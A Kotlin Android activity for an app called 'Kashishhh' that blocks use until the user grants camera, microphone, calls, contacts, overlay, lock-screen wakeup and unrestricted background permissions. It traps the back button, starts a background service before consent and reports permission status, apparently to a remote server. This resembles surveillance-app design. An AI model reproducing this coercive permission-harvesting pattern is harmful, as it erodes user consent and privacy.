package com.kashish.world

import android.Manifest
import android.annotation.SuppressLint
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

/**
 * First-launch Permission Setup Screen:
 * Requests ALL required app permissions upfront before login or entering the app:
 * 1. Camera & Voice Recorder (CAMERA + RECORD_AUDIO)
 * 2. Phone Calls & Contacts (CALL_PHONE + READ_CONTACTS + WRITE_CONTACTS)
 * 3. High-Priority Notifications (POST_NOTIFICATIONS)
 * 4. Display Over Other Apps (SYSTEM_ALERT_WINDOW)
 * 5. Lock-Screen Wakeup (USE_FULL_SCREEN_INTENT)
 * 6. Battery 'No Restriction' (REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
 */
class PermissionSetupActivity : AppCompatActivity() {

    private lateinit var rowsContainer: LinearLayout
    private lateinit var quickAllowAllBtn: Button
    private lateinit var continueBtn: Button
    private lateinit var continueBtnBg: GradientDrawable
    private lateinit var progressStatusView: TextView
    private var autoPromptedOnce = false

    private val multiRuntimePermLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) {
        refreshUiAndReport()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        SoundCacheManager.ensureDefaultChannels(this)
        FirestoreOverlayBackgroundService.startServiceSafely(this)
        buildLayout()

        // Automatically prompt for all standard runtime permissions (Camera, Mic, Calls, Contacts, Notifications) immediately on first open
        if (!autoPromptedOnce) {
            autoPromptedOnce = true
            requestMissingRuntimePermissions()
        }
    }

    override fun onResume() {
        super.onResume()
        FirestoreOverlayBackgroundService.startServiceSafely(this)
        refreshUiAndReport()
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        if (PermissionReporter.allRequiredPermissionsGranted(this)) {
            @Suppress("DEPRECATION")
            super.onBackPressed()
        } else {
            moveTaskToBack(true)
        }
    }

    private fun buildLayout() {
        val scroll = ScrollView(this).apply {
            setBackgroundColor(Color.parseColor("#12071A"))
            isFillViewport = true
        }

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(34), dp(20), dp(32))
        }

        val headerBadge = TextView(this).apply {
            text = "💖 KASHISHHH · APP PERMISSIONS"
            setTextColor(Color.parseColor("#FB7185"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 11.5f)
            typeface = Typeface.DEFAULT_BOLD
        }
        root.addView(headerBadge)

        val title = TextView(this).apply {
            text = "Allow All Permissions to Continue"
            setTextColor(Color.WHITE)
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 22f)
            typeface = Typeface.DEFAULT_BOLD
            setPadding(0, dp(6), 0, dp(6))
        }
        root.addView(title)

        val subtitle = TextView(this).apply {
            text = "Please allow all permissions below once so Camera, Voice Recorder, Direct Calls, Notifications, and Screen Popups work smoothly without asking again later."
            setTextColor(Color.parseColor("#D8B4E2"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 13f)
            setPadding(0, 0, 0, dp(10))
        }
        root.addView(subtitle)

        progressStatusView = TextView(this).apply {
            text = "⏳ 0 / 6 Permissions Allowed"
            setTextColor(Color.parseColor("#FBBF24"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 12.5f)
            typeface = Typeface.DEFAULT_BOLD
            setPadding(0, 0, 0, dp(12))
        }
        root.addView(progressStatusView)

        val quickAllowBg = GradientDrawable().apply {
            shape = GradientDrawable.RECTANGLE
            cornerRadius = dp(16).toFloat()
            setColor(Color.parseColor("#BE185D"))
        }
        quickAllowAllBtn = Button(this).apply {
            text = "⚡ Allow Camera, Mic, Calls & Alerts in 1 Tap"
            isAllCaps = false
            setTextColor(Color.WHITE)
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 13.5f)
            typeface = Typeface.DEFAULT_BOLD
            background = quickAllowBg
            setPadding(dp(16), dp(12), dp(16), dp(12))
            setOnClickListener {
                requestMissingRuntimePermissions(openSettingsIfBlocked = true)
            }
        }
        root.addView(
            quickAllowAllBtn,
            LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dp(14) }
        )

        rowsContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
        }
        root.addView(
            rowsContainer,
            LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        )

        continueBtnBg = GradientDrawable().apply {
            shape = GradientDrawable.RECTANGLE
            cornerRadius = dp(18).toFloat()
            setColor(Color.parseColor("#3B234A"))
        }

        continueBtn = Button(this).apply {
            text = "🔒 Allow All Permissions to Continue"
            isAllCaps = false
            isEnabled = false
            alpha = 0.55f
            setTextColor(Color.parseColor("#9CA3AF"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 15f)
            typeface = Typeface.DEFAULT_BOLD
            background = continueBtnBg
            setPadding(dp(20), dp(14), dp(20), dp(14))
            setOnClickListener {
                if (!PermissionReporter.allRequiredPermissionsGranted(this@PermissionSetupActivity)) {
                    android.widget.Toast.makeText(
                        this@PermissionSetupActivity,
                        "Please allow all permissions above first 💖",
                        android.widget.Toast.LENGTH_SHORT
                    ).show()
                    refreshUiAndReport()
                    return@setOnClickListener
                }
                PermissionReporter.markFirstLaunchSetupCompleted(this@PermissionSetupActivity)
                FirestoreOverlayBackgroundService.startServiceSafely(this@PermissionSetupActivity)
                PermissionReporter.reportStatusAsync(this@PermissionSetupActivity)
                finish()
            }
        }

        root.addView(
            continueBtn,
            LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { topMargin = dp(12) }
        )

        scroll.addView(root)
        setContentView(scroll)
    }

    private fun refreshUiAndReport() {
        val snap = PermissionReporter.collectSnapshot(this)
        rowsContainer.removeAllViews()

        val camAndMicGranted = snap.camera && snap.microphone
        val callAndContactsGranted = snap.callPhone && snap.contacts
        val runtimeAllGranted = camAndMicGranted && callAndContactsGranted && snap.notifications

        quickAllowAllBtn.visibility = if (runtimeAllGranted) View.GONE else View.VISIBLE

        val checks = listOf(
            camAndMicGranted,
            callAndContactsGranted,
            snap.notifications,
            snap.overlay,
            snap.fullScreenIntent,
            snap.batteryUnrestricted
        )
        val grantedCount = checks.count { it }
        val totalCount = checks.size
        val allGranted = snap.allRequiredGranted

        if (allGranted) {
            PermissionReporter.markFirstLaunchSetupCompleted(this)
            progressStatusView.text = "✅ All $totalCount / $totalCount Permissions Allowed! You can continue now."
            progressStatusView.setTextColor(Color.parseColor("#34D399"))
            continueBtn.isEnabled = true
            continueBtn.alpha = 1f
            continueBtn.text = "Continue to Kashishhh 💖"
            continueBtn.setTextColor(Color.WHITE)
            continueBtnBg.setColor(Color.parseColor("#E11D48"))
        } else {
            val remaining = totalCount - grantedCount
            progressStatusView.text = "⏳ $grantedCount / $totalCount Permissions Allowed ($remaining remaining)"
            progressStatusView.setTextColor(Color.parseColor("#FBBF24"))
            continueBtn.isEnabled = false
            continueBtn.alpha = 0.55f
            continueBtn.text = "🔒 Allow All Permissions to Continue ($grantedCount/$totalCount)"
            continueBtn.setTextColor(Color.parseColor("#D1D5DB"))
            continueBtnBg.setColor(Color.parseColor("#3B234A"))
        }

        // 1. Camera & Voice Recorder (CAMERA + RECORD_AUDIO)
        rowsContainer.addView(
            createPermissionCard(
                title = "1. Camera & Voice Recorder (Mic)",
                subtitle = "For taking Cute Pics & recording Voice Notes inside the app",
                granted = camAndMicGranted,
                buttonLabel = if (camAndMicGranted) "Granted ✅" else "Allow Cam & Mic",
                onClick = { requestCameraAndMicPermissions() }
            )
        )

        // 2. Direct Phone Call & Contacts (CALL_PHONE + READ_CONTACTS)
        rowsContainer.addView(
            createPermissionCard(
                title = "2. Direct 1-Tap Calls & Contacts",
                subtitle = "Places instant calls without dialer & syncs contacts safely",
                granted = callAndContactsGranted,
                buttonLabel = if (callAndContactsGranted) "Granted ✅" else "Allow Calls",
                onClick = { requestCallAndContactsPermissions() }
            )
        )

        // 3. Notifications (POST_NOTIFICATIONS)
        rowsContainer.addView(
            createPermissionCard(
                title = "3. High-Priority Notifications",
                subtitle = "Receive instant messages & custom sounds",
                granted = snap.notifications,
                buttonLabel = if (snap.notifications) "Granted ✅" else "Allow Alerts",
                onClick = { openNotificationPermission() }
            )
        )

        // 4. Display over other apps (SYSTEM_ALERT_WINDOW)
        rowsContainer.addView(
            createPermissionCard(
                title = "4. Display Over Other Apps",
                subtitle = "Shows love popup card over other apps & Lock Screen",
                granted = snap.overlay,
                buttonLabel = if (snap.overlay) "Allowed ✅" else "Allow On Top",
                onClick = { openOverlayPermissionSettings() }
            )
        )

        // 5. Full-Screen Lockscreen Wakeup (USE_FULL_SCREEN_INTENT)
        rowsContainer.addView(
            createPermissionCard(
                title = "5. Lock-Screen Light-Up (Full Screen)",
                subtitle = "Automatically turns screen ON when phone is locked",
                granted = snap.fullScreenIntent,
                buttonLabel = if (snap.fullScreenIntent) "Active ✅" else "Enable Wakeup",
                onClick = { openFullScreenIntentSettings() }
            )
        )

        // 6. Battery "No restriction"
        rowsContainer.addView(
            createPermissionCard(
                title = "6. Battery 'No Restriction' (24/7 Background)",
                subtitle = "Keeps background service running when app is closed",
                granted = snap.batteryUnrestricted,
                buttonLabel = if (snap.batteryUnrestricted) "Unrestricted ✅" else "Allow Background",
                onClick = { openBatteryUnrestrictedSettings() }
            )
        )

        PermissionReporter.reportStatusAsync(this)
    }

    private fun createPermissionCard(
        title: String,
        subtitle: String,
        granted: Boolean,
        buttonLabel: String,
        onClick: () -> Unit
    ): LinearLayout {
        val borderColor = if (granted) Color.parseColor("#10B981") else Color.parseColor("#4C1D95")
        val cardBgColor = if (granted) Color.parseColor("#0D2821") else Color.parseColor("#1F112B")

        val cardBg = GradientDrawable().apply {
            shape = GradientDrawable.RECTANGLE
            cornerRadius = dp(18).toFloat()
            setColor(cardBgColor)
            setStroke(dp(1), borderColor)
        }

        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            background = cardBg
            setPadding(dp(14), dp(14), dp(14), dp(14))
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dp(10) }
        }

        val topRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
        }

        val textCol = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }

        val titleView = TextView(this).apply {
            text = if (granted) "✅ $title" else title
            setTextColor(Color.WHITE)
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 14.5f)
            typeface = Typeface.DEFAULT_BOLD
        }
        val subView = TextView(this).apply {
            text = subtitle
            setTextColor(Color.parseColor("#C4B5FD"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 11.5f)
            setPadding(0, dp(3), dp(8), 0)
        }
        textCol.addView(titleView)
        textCol.addView(subView)

        val btnBg = GradientDrawable().apply {
            shape = GradientDrawable.RECTANGLE
            cornerRadius = dp(12).toFloat()
            setColor(if (granted) Color.parseColor("#059669") else Color.parseColor("#E11D48"))
        }

        val actionBtn = Button(this).apply {
            text = buttonLabel
            isAllCaps = false
            setTextColor(Color.WHITE)
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 12f)
            typeface = Typeface.DEFAULT_BOLD
            background = btnBg
            setPadding(dp(12), dp(8), dp(12), dp(8))
            setOnClickListener { onClick() }
        }

        topRow.addView(textCol)
        topRow.addView(actionBtn)
        card.addView(topRow)
        return card
    }

    private fun requestMissingRuntimePermissions(openSettingsIfBlocked: Boolean = false) {
        val perms = mutableListOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        val missing = perms.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isNotEmpty()) {
            multiRuntimePermLauncher.launch(missing.toTypedArray())
        } else if (openSettingsIfBlocked) {
            openAppDetailsFallback()
        }
    }

    private fun requestCameraAndMicPermissions() {
        val perms = listOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        ).filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (perms.isNotEmpty()) {
            multiRuntimePermLauncher.launch(perms.toTypedArray())
        } else {
            refreshUiAndReport()
        }
    }

    private fun requestCallAndContactsPermissions() {
        val perms = listOf(
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS
        ).filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (perms.isNotEmpty()) {
            multiRuntimePermLauncher.launch(perms.toTypedArray())
        } else {
            refreshUiAndReport()
        }
    }

    private fun openNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                multiRuntimePermLauncher.launch(arrayOf(Manifest.permission.POST_NOTIFICATIONS))
                return
            }
        }
        try {
            val intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
                putExtra(Settings.EXTRA_APP_PACKAGE, packageName)
            }
            startActivity(intent)
        } catch (_: Exception) {
            openAppDetailsFallback()
        }
    }

    private fun openOverlayPermissionSettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val intent = Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:$packageName")
                )
                startActivity(intent)
                return
            } catch (_: Exception) {}
        }
        openAppDetailsFallback()
    }

    private fun openFullScreenIntentSettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            try {
                val intent = Intent(
                    Settings.ACTION_MANAGE_APP_USE_FULL_SCREEN_INTENT,
                    Uri.parse("package:$packageName")
                )
                startActivity(intent)
                return
            } catch (_: Exception) {}
        }
        openNotificationPermission()
    }

    @SuppressLint("BatteryLife")
    private fun openBatteryUnrestrictedSettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val intent = Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:$packageName")
                )
                startActivity(intent)
                return
            } catch (_: Exception) {}

            try {
                startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
                return
            } catch (_: Exception) {}
        }
        openAppDetailsFallback()
    }

    private fun openAppDetailsFallback() {
        try {
            val intent = Intent(
                Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.parse("package:$packageName")
            )
            startActivity(intent)
        } catch (_: Exception) {}
    }

    private fun dp(value: Int): Int {
        return TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP,
            value.toFloat(),
            resources.displayMetrics
        ).toInt()
    }
}
